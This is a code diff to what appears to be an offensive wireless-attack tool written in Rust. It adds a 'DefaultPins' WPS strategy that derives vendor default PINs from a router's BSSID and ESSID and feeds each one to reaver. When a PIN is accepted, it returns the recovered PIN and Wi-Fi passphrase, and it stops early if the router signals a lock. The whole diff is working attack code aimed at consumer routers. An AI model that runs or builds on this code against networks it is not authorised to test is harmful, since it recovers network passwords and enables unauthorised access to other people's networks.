@@ -46,6 +46,8 @@ pub enum WpsStrategy {
     OnlineBrute,
     /// Single-shot probe of the historical `00000000` PIN.
     NullPin,
+    /// Vendor default PINs (BSSID/ESSID-derived) — the instant-win path.
+    DefaultPins,
     /// Probe to discover WPS, no attack attempted.
     Detect,
 }
@@ -169,6 +171,60 @@ pub fn try_pixie_dust(bssid: &str, m1: &[u8], m3: &[u8]) -> WpsResult {
 /// This can take hours; the agent streams progress to the GUI. We delegate
 /// the actual PIN enumeration to `reaver` (the canonical tool) and parse
 /// its output for the recovered PIN.
+/// Try the vendor default PINs (BSSID/ESSID-derived) before any expensive
+/// strategy: ComputePIN (zhaochunsheng), the kcdtv FTE-XXXX variant, and the
+/// static factory PIN table — each is a single reaver run, so the whole
+/// battery costs seconds. This is the "instant win" path for routers whose
+/// owners never rotated the factory PIN.
+pub fn try_default_pins(bssid: &str, essid: &str) -> WpsResult {
+    let started = std::time::Instant::now();
+    let candidates =
+        netspecter_common::wps_default_pins::default_pin_candidates(bssid, essid);
+
+    if candidates.is_empty() {
+        return WpsResult {
+            bssid: bssid.into(),
+            strategy: WpsStrategy::DefaultPins,
+            pin: None,
+            psk: None,
+            duration_secs: started.elapsed().as_secs(),
+            status: "no default-PIN candidates for this BSSID".into(),
+        };
+    }
+
+    let tried: Vec<String> = candidates.iter().map(|c| c.pin.clone()).collect();
+    for cand in &candidates {
+        // One reaver run per candidate PIN: instant accept or move on.
+        let outcome = run_reaver_with_pin(bssid, &cand.pin);
+        if outcome.success {
+            return WpsResult {
+                bssid: bssid.into(),
+                strategy: WpsStrategy::DefaultPins,
+                pin: Some(cand.pin.clone()),
+                psk: outcome.psk,
+                duration_secs: started.elapsed().as_secs(),
+                status: format!("factory default PIN accepted ({})", cand.source),
+            };
+        }
+        // Some APs lock after a few failures — stop early on lock signals.
+        if outcome.status.contains("locked") || outcome.status.contains("fail") {
+            break;
+        }
+    }
+
+    WpsResult {
+        bssid: bssid.into(),
+        strategy: WpsStrategy::DefaultPins,
+        pin: None,
+        psk: None,
+        duration_secs: started.elapsed().as_secs(),
+        status: format!(
+            "no default PIN accepted (tried: {})",
+            tried.join(", ")
+        ),
+    }
+}
+
 pub fn try_online_brute(bssid: &str, channel: &str, timeout_secs: u64) -> WpsResult {
     let started = std::time::Instant::now();
 
